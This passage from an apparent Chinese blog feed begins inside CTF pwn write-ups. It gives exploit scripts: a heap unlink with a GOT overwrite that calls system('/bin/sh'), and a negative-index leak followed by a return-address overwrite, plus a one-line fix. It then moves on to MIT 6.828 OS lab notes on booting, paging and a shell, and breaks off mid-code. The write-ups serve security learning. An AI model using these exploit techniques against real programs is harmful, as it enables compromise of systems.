class="number">0x530</span>)</span><br><span class="line">payload = flat([<span class="number">0</span>,<span class="number">0x521</span>,<span class="number">0x4040E8</span>-<span class="number">0x18</span>,<span class="number">0x4040E8</span>-<span class="number">0x10</span>])</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b'a'</span>*<span class="number">0x10</span>+p64(e.got[<span class="string">'free'</span>]))</span><br><span class="line">edit(<span class="number">0</span>,p64(p.system_addr))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="array-index-bank"><a href="#array-index-bank" class="headerlink" title="array_index_bank"></a>array_index_bank</h2><p>负数索引,泄露pie和栈地址,然后绕过一些检查先改you再改返回地址就行了.</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">'1'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"?"</span>,<span class="string">'-3'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'] = '</span>)</span><br><span class="line">pie_base = p.recvaddress(<span class="string">"int"</span>)-<span class="number">0x14ff</span></span><br><span class="line">lg(<span class="string">"pie_base"</span>,pie_base)</span><br><span class="line"></span><br><span class="line">you = pie_base+<span class="number">0x4010</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">'1'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"?"</span>,<span class="string">'-2'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'] = '</span>)</span><br><span class="line">ret_addr = p.recvaddress(<span class="string">"int"</span>)+<span class="number">8</span></span><br><span class="line">stack = ret_addr-<span class="number">0x38</span></span><br><span class="line">lg(<span class="string">"ret"</span>,ret_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">'2'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"?"</span>,<span class="built_in">str</span>((you-stack)//<span class="number">8</span>))</span><br><span class="line">io.sendlineafter(<span class="string">"?"</span>,<span class="built_in">str</span>(<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">'2'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"?"</span>,<span class="built_in">str</span>((ret_addr-stack)//<span class="number">8</span>))</span><br><span class="line">io.sendlineafter(<span class="string">"?"</span>,<span class="built_in">str</span>(pie_base+<span class="number">0x1318</span>))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h3 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h3><p>改为无符号比较:jle-&gt;jbe</p>]]></content>
      
      
      <categories>
          
          <category> ctf复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.828 Lab1-Lab2</title>
      <link href="/2023/6.828-Lab1-2/"/>
      <url>/2023/6.828-Lab1-2/</url>
      
        <content type="html"><![CDATA[<h1 id="LEC-1"><a href="#LEC-1" class="headerlink" title="LEC 1"></a>LEC 1</h1><h2 id="操作系统概述"><a href="#操作系统概述" class="headerlink" title="操作系统概述"></a>操作系统概述</h2><p>管道本质上是一个内核的缓冲区,大多数情况下半开工,描述符可跨fork继承.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309202328496.png"></p><h2 id="Lab-1-Booting-a-PC"><a href="#Lab-1-Booting-a-PC" class="headerlink" title="Lab 1: Booting a PC"></a>Lab 1: Booting a PC</h2><h3 id="PC-Bootstrap"><a href="#PC-Bootstrap" class="headerlink" title="PC Bootstrap"></a>PC Bootstrap</h3><p>BIOS: 设置中断描述符表,初始化设备.加载bootloader</p><blockquote><p>When the BIOS runs, it sets up an interrupt descriptor table and initializes various devices such as the VGA display. This is where the “Starting SeaBIOS” message you see in the QEMU window comes from. </p></blockquote><span id="more"></span><p>计算机通电后地址设为0xf000:0xfff0,通过一个jmp指令跳转到BIOS的稍前部分</p><blockquote><p>Therefore we shouldn’t be surprised that the first thing that the BIOS does is jmp backwards to an earlier location in the BIOS</p></blockquote><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309211035578.png"></p><h3 id="The-Boot-Loader"><a href="#The-Boot-Loader" class="headerlink" title="The Boot Loader"></a>The Boot Loader</h3><p>BIOS将第一个扇区(引导扇区)加载到物理地址0x7c00~0x7dff的内存中,jmp到0x0000:0x7c00,控制权转移到bootloader.</p><blockquote><p>如果此扇区末尾两个字节分别是魔数0x55和0xaa，则BIOS认为此扇区中存在可执行的程序</p></blockquote><blockquote><p>Floppy and hard disks for PCs are divided into 512 byte regions called sectors. A sector is the disk’s minimum transfer granularity: each read or write operation must be one or more sectors in size and aligned on a sector boundary. If the disk is bootable, the first sector is called the boot sector, since this is where the boot loader code resides. When the BIOS finds a bootable floppy or hard disk, it loads the 512-byte boot sector into memory at physical addresses 0x7c00 through 0x7dff, and then uses a jmp instruction to set the CS:IP to 0000:7c00, passing control to the boot loader. Like the BIOS load address, these addresses are fairly arbitrary - but they are fixed and standardized for PCs.</p></blockquote><p>MBR与bootloader的关系.</p><blockquote><p>MBR是主引导记录（Master Boot Record），也被称为主引导扇区，是计算机开机以后访问硬盘时所必须要读取的第一个扇区。其内部前446字节存储了bootloader代码，其后是4个16字节的“磁盘分区表”。</p></blockquote><h4 id="boot-S流程分析"><a href="#boot-S流程分析" class="headerlink" title="boot.S流程分析"></a>boot.S流程分析</h4><p>.set 相当于define的宏定义</p><p>.code16以16-bit模式产生代码<br>cli(clear interrupt flag),禁止中断发生.</p><blockquote><p> 下面是两条规则：<br>       1）在改变SS：SP之前，必须用cli指令屏蔽中断，然后等操作执行完立即用sti指令恢复<br>       2）SS：SP需要设置在空闲的内存地址，不要建立在其他的程序（尤其是系统的）代码区   </p></blockquote><p>cld(clear direction flag),清除方向标志位,当方向位清除时,字符串操作按递增地址的方式进行.<br>对应的有sti,std(set)</p><p>开启A20 gate:向0x64端口写入0xd1的命令,再向0x60端口写入0xdf(0x11011111)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">seta20.1:</span><br><span class="line">  inb     $0x64,%al               # Wait for not busy</span><br><span class="line">  testb   $0x2,%al</span><br><span class="line">  jnz     seta20.1</span><br><span class="line"></span><br><span class="line">  movb    $0xd1,%al               # 0xd1 -&gt; port 0x64</span><br><span class="line">  outb    %al,$0x64</span><br><span class="line"></span><br><span class="line">seta20.2:</span><br><span class="line">  inb     $0x64,%al               # Wait for not busy</span><br><span class="line">  testb   $0x2,%al</span><br><span class="line">  jnz     seta20.2</span><br><span class="line"></span><br><span class="line">  movb    $0xdf,%al               # 0xdf -&gt; port 0x60</span><br><span class="line">  outb    %al,$0x60</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309211153437.png"></p><p>加载gdt,lgdt 48位内存数据,加载到48位寄存器GDTR,16位的(gdt)段界限,32位的(gdt)段基址<br>gdt初始化内容:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Bootstrap GDT</span><br><span class="line">.p2align 2                                # force 4 byte alignment</span><br><span class="line">gdt:</span><br><span class="line">  SEG_NULL# null seg</span><br><span class="line">  SEG(STA_X|STA_R, 0x0, 0xffffffff)# code seg</span><br><span class="line">  SEG(STA_W, 0x0, 0xffffffff)    </span><br></pre></td></tr></tbody></table></figure><p>将%cr0寄存器PE标志置1,长跳转ljmp $PROT_MODE_CSEG, $protcseg以更新cs基地址,正式进入保护模式.</p><p>更新其他段寄存器<br>这里有个点需要注意一下,段选择子的0-1位用来存储RPL,第2位是TI(table indicator)位,用来指示选择子是在GDT(0)还是LDT(1)中,3~15位是13位的段描述符索引值,所以boot.S中定义的0x8和0x10代表的序号其实是1和2.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.set PROT_MODE_CSEG, 0x8         # kernel code segment selector</span><br><span class="line">.set PROT_MODE_DSEG, 0x10        # kernel data segment selector</span><br></pre></td></tr></tbody></table></figure><p>设置esp后便可以调用c代码bootmain.</p><blockquote><p>control starts in boot.S – which sets up protected mode,and a stack so C code then run, then calls bootmain()</p></blockquote><h4 id="boot-main-c流程分析"><a href="#boot-main-c流程分析" class="headerlink" title="(boot)main.c流程分析"></a>(boot)main.c流程分析</h4><p>从扇区1(第二个扇区)的位置开始,从硬盘读取8个扇区(一个页大小)的数据到物理内存0x10000处.这一个页的内容只是ELF文件(Kernel)的部分内容,但至少包含了完整的文件头.接下来便根据程序头表读入程序中的各个段到内存中,(这里的段不是内存中的段,而是硬盘上ELF文件中的各个代码段数据段等),形成内核映像,即真正运行的内核.</p><blockquote><p>内核被加载到内存后,loader还要通过分析其elf结构将其展开到新的位置,所以说,内核在内存中有两份拷贝,一份是elf格式的源文件kernel.bin,另一份是loader解析elf格式的kernel.bin后在内存中生成的内核映像,这个映像才是真正运行的内核.</p></blockquote><p>完成内核的加载后,跳转到ELF头中记录的内核的入口点.0x10000c</p><p>补充一下JOS的磁盘镜像相关内容.JOS的引导盘由两部分组成,boot和kernel,boot位于第一个扇区(引导扇区).所以需要从扇区1开始读取Kernel的ELF文件.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># How to build the kernel disk image</span><br><span class="line">$(OBJDIR)/kern/kernel.img: $(OBJDIR)/kern/kernel $(OBJDIR)/boot/boot</span><br><span class="line">@echo + mk $@</span><br><span class="line">$(V)dd if=/dev/zero of=$(OBJDIR)/kern/kernel.img~ count=10000 2&gt;/dev/null</span><br><span class="line">$(V)dd if=$(OBJDIR)/boot/boot of=$(OBJDIR)/kern/kernel.img~ conv=notrunc 2&gt;/dev/null</span><br><span class="line">$(V)dd if=$(OBJDIR)/kern/kernel of=$(OBJDIR)/kern/kernel.img~ seek=1 conv=notrunc 2&gt;/dev/null</span><br><span class="line">$(V)mv $(OBJDIR)/kern/kernel.img~ $(OBJDIR)/kern/kernel.img</span><br></pre></td></tr></tbody></table></figure><h3 id="The-Kernel"><a href="#The-Kernel" class="headerlink" title="The Kernel"></a>The Kernel</h3><h4 id="entry-S流程分析"><a href="#entry-S流程分析" class="headerlink" title="entry.S流程分析"></a>entry.S流程分析</h4><p>上来第一个指令就看不懂</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movw$0x1234,0x472# warm boot</span><br></pre></td></tr></tbody></table></figure><p>加载页目录表到$cr3(页目录寄存器)<br>$cr0的PG位置1,开启分页模式.<br>初始化堆栈</p><p>开启分页模式后,线性地址的高十位作为页目录表entry_pgdir的索引,中间10位作为页表entry_pgtable的索引.<br>如0xf0100000,页部件先以960为索引在页目录表中找到对应的页表条目,再以256为索引找到页表条目中的物理地址0x100000.<br>理解了这个过程之后再看entrypgdir.c就明白如下映射的原理了:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[KERNBASE, KERNBASE+4MB) --&gt; [0, 4MB) .</span><br><span class="line">[0, 4MB) --&gt; [0, 4MB)</span><br></pre></td></tr></tbody></table></figure><h4 id="Formatted-Printing-to-the-Console"><a href="#Formatted-Printing-to-the-Console" class="headerlink" title="Formatted Printing to the Console"></a>Formatted Printing to the Console</h4><p>c可变参数的实现机制:<br> va_list args;               // 准备接受参数的列表对象<br> va_start(args, fmt);        // 从…中取出参数到args中，并指定…之前的参数<br> T va_arg（va_list， T）;<br> va_end(args);               // 释放参数列表</p><p>其实就是通过va_start得到固定参数fmt的地址再加上sizeof(fmt)得到第一个参数的地址,之后每次调用va_arg函数获得T类型的参数值,并加sizeof(T)指向下一个参数.</p><p>八进制改改就好了</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'o'</span>:</span><br><span class="line"><span class="comment">// Replace this with your code.</span></span><br><span class="line">num = getint(&amp;ap,lflag);</span><br><span class="line"><span class="keyword">if</span>((<span class="type">long</span> <span class="type">long</span>)num &lt; <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">putch(<span class="string">'-'</span>,putdat);</span><br><span class="line">num = -(<span class="type">long</span> <span class="type">long</span>)num;</span><br><span class="line">}</span><br><span class="line">base = <span class="number">8</span>;</span><br><span class="line"><span class="keyword">goto</span> number;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></tbody></table></figure><h4 id="The-Stack"><a href="#The-Stack" class="headerlink" title="The Stack"></a>The Stack</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">mon_backtrace</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// Your code here.</span></span><br><span class="line">cprintf(<span class="string">"Stack backtrace:\n"</span>);</span><br><span class="line"><span class="type">uint32_t</span> ebp = read_ebp();</span><br><span class="line"><span class="type">uint32_t</span> eip = *(<span class="type">uint32_t</span>*)(ebp+<span class="number">4</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Eipdebuginfo</span> <span class="title">dinfo</span>;</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">{</span><br><span class="line">debuginfo_eip(eip,&amp;dinfo);</span><br><span class="line">cprintf(<span class="string">"  ebp %08x  eip %08x  args %08x %08x %08x %08x %08x\n"</span>,ebp,eip,*(<span class="type">uint32_t</span>*)(ebp+<span class="number">8</span>),*(<span class="type">uint32_t</span>*)(ebp+<span class="number">12</span>),*(<span class="type">uint32_t</span>*)(ebp+<span class="number">16</span>),*(<span class="type">uint32_t</span>*)(ebp+<span class="number">20</span>),*(<span class="type">uint32_t</span>*)(ebp+<span class="number">24</span>));</span><br><span class="line">cprintf(<span class="string">"         %s:%d: %.*s+%d\n"</span>,dinfo.eip_file,dinfo.eip_line,dinfo.eip_fn_namelen,dinfo.eip_fn_name,eip-dinfo.eip_fn_addr);</span><br><span class="line">ebp = *(<span class="type">uint32_t</span>*)(ebp);</span><br><span class="line"><span class="keyword">if</span>(ebp!=<span class="number">0</span>)</span><br><span class="line">eip = *(<span class="type">uint32_t</span>*)(ebp+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>其实没怎么弄明白.<br><a href="https://sourceware.org/gdb/onlinedocs/stabs.html#Symbol-Tables">https://sourceware.org/gdb/onlinedocs/stabs.html#Symbol-Tables</a><br><a href="https://sourceware.org/gdb/onlinedocs/stabs.html#Line-Numbers">https://sourceware.org/gdb/onlinedocs/stabs.html#Line-Numbers</a></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">stab_binsearch(stabs, &amp;lline, &amp;rline, N_SLINE, addr);</span><br><span class="line"><span class="keyword">if</span> (lline &lt;= rline) {</span><br><span class="line">info-&gt;eip_line = stabs[lline].n_desc;</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">info-&gt;eip_fn_addr = addr;</span><br><span class="line">lline = lfile;</span><br><span class="line">rline = rfile;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="LEC-3"><a href="#LEC-3" class="headerlink" title="LEC 3"></a>LEC 3</h1><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>先学学pipe的用法.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span>    pipefd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">char</span>   buf;</span><br><span class="line">    <span class="type">pid_t</span>  cpid;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Usage: %s &lt;string&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipefd) == <span class="number">-1</span>) {</span><br><span class="line">        perror(<span class="string">"pipe"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    }</span><br><span class="line">    cpid = fork();</span><br><span class="line">    <span class="keyword">if</span> (cpid == <span class="number">-1</span>) {</span><br><span class="line">        perror(<span class="string">"fork"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (cpid == <span class="number">0</span>) {    <span class="comment">/* Child reads from pipe */</span></span><br><span class="line">        close(pipefd[<span class="number">1</span>]);          <span class="comment">/* Close unused write end */</span></span><br><span class="line">        <span class="keyword">while</span> (read(pipefd[<span class="number">0</span>], &amp;buf, <span class="number">1</span>) &gt; <span class="number">0</span>)</span><br><span class="line">            write(STDOUT_FILENO, &amp;buf, <span class="number">1</span>);</span><br><span class="line">        write(STDOUT_FILENO, <span class="string">"\n"</span>, <span class="number">1</span>);</span><br><span class="line">        close(pipefd[<span class="number">0</span>]);</span><br><span class="line">        _exit(EXIT_SUCCESS);</span><br><span class="line">    } <span class="keyword">else</span> {            <span class="comment">/* Parent writes argv[1] to pipe */</span></span><br><span class="line">        close(pipefd[<span class="number">0</span>]);          <span class="comment">/* Close unused read end */</span></span><br><span class="line">        write(pipefd[<span class="number">1</span>], argv[<span class="number">1</span>], <span class="built_in">strlen</span>(argv[<span class="number">1</span>]));</span><br><span class="line">        close(pipefd[<span class="number">1</span>]);          <span class="comment">/* Reader will see EOF */</span></span><br><span class="line">        wait(<span class="literal">NULL</span>);                <span class="comment">/* Wait for child */</span></span><br><span class="line">        <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Execute cmd.  Never returns.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">runcmd</span><span class="params">(<span class="keyword">struct</span> cmd *cmd)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> p[<span class="number">2</span>], r;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">execcmd</span> *<span class="title">ecmd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipecmd</span> *<span class="title">pcmd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">redircmd</span> *<span class="title">rcmd</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(cmd == <span class="number">0</span>)</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">switch</span>(cmd-&gt;type){</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"unknown runcmd\n"</span>);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">' '</span>:</span><br><span class="line">    ecmd = (<span class="keyword">struct</span> execcmd*)cmd;</span><br><span class="line">    <span class="keyword">if</span>(ecmd-&gt;argv[<span class="number">0</span>] == <span class="number">0</span>)</span><br><span class="line">      _exit(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Your code here ...</span></span><br><span class="line">    execve(ecmd-&gt;argv[<span class="number">0</span>],ecmd-&gt;argv,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'&gt;'</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'&lt;'</span>:</span><br><span class="line">    rcmd = (<span class="keyword">struct</span> redircmd*)cmd;</span><br><span class="line">    <span class="comment">// Your code here ...</span></span><br><span class="line">    r = open(rcmd-&gt;file,rcmd-&gt;flags,S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH);</span><br><span class="line">    <span class="keyword">if</span>(r==<span class="number">-1</span>)</span><br><span class="line">    {</span><br><span class="line">      perror(<span class="string">"no such file"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(dup2(r,rcmd-&gt;fd)==<span class="number">-1</span>)</span><br><span class="line">      perror(<span class="string">"dup2 fail"</span>);</span><br><span class="line">    runcmd(rcmd-&gt;cmd);</span><br><span class="line">    close(rcmd-&gt;fd);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'|'</span>:</span><br><span class="line">    <span class="keyword">if</span>(pipe(p)==<span class="number">-1</span>)</span><br><span class="line">      perror(<span class="string">"pipe create error"</span>);</span><br><span class="line">    pcmd = (<span class="keyword">struct</span> pipecmd*)cmd;</span><br><span class="line">    <span class="keyword">if</span>(fork1()==<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">      close(p[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">if</span>(dup2(p[<span class="number">1</span>],STDOUT_FILENO)==<span class="number">-1</span>)</span><br><span class="line">        perror(<span class="string">"dup2 fail"</span>);</span><br><span class="line">      runcmd(pcmd-&gt;left);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">          wait(&amp;r);</span><br><span class="line">          close(p[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">if</span>(dup2(p[<span class="number">0</span>],STDIN_FILENO)==<span class="number">-1</span>)</span><br><span class="line">        perror(<span class="string">"dup2 fail"</span>);</span><br><span class="line">      runcmd(pcmd-&gt;right);   </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  }    </span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="Lab-2-Memory-Management"><a href="#Lab-2-Memory-Management" class="headerlink" title="Lab 2: Memory Management"></a>Lab 2: Memory Management</h2><h3 id="mem-init流程分析"><a href="#mem-init流程分析" class="headerlink" title="mem_init流程分析"></a>mem_init流程分析</h3><p>可以先看完下面的部分再来看流程分析.<br>删去了注释和check.<br>先<code>i386_detect_memory</code>检测机器的物理空间大小,然后使用boot_alloc分配一个kern_pgdir的页目录表.<br>再次boot_alloc为每一个物理页分配一个PageInfo管理结构.<br>之后<code>page_init</code>完成对整个物理页的初始化.标记不可分配或正在使用的物理页为inuse,完成空闲页链表page_free_list的创建.<br>在之后调用三次boot_map_region在kern_pgdir中完成对用户页表UPAGES,内核栈,内核地址空间的映射.<br>安装kern_pgdir替换之前临时的entry_pgdir.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 